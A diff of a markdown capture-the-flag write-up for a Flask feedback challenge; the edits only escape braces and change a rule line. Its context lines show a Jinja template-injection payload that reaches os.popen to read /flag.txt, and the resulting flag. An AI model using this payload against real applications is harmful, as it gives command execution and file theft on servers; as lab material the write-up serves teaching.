@@ -8,11 +8,11 @@ tags: ["cyber", "python", "flask", "ctf", "exploit"]
 
 ## Challenge description
 
-Thank you for your feedback { name }
+Thank you for your feedback \{ name }
 
 Flag is in /flag.txt
 
----
+___
 
 ## Approach
 
@@ -48,7 +48,7 @@ We can abuse the arbitrary Jinja execution to get arbitrary bash execution and c
 {{request.application.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read()}}
 ```
 
-> Thank you for your feedback RISC{y0ur_f33db4ck_1snt_p4rt1cul4rly_s4f3!\_e85dae1c0b362b4c7019905ca3a56ecf}
+> Thank you for your feedback RISC\{y0ur_f33db4ck_1snt_p4rt1cul4rly_s4f3!\_e85dae1c0b362b4c7019905ca3a56ecf}
 
 So our flag is:
 
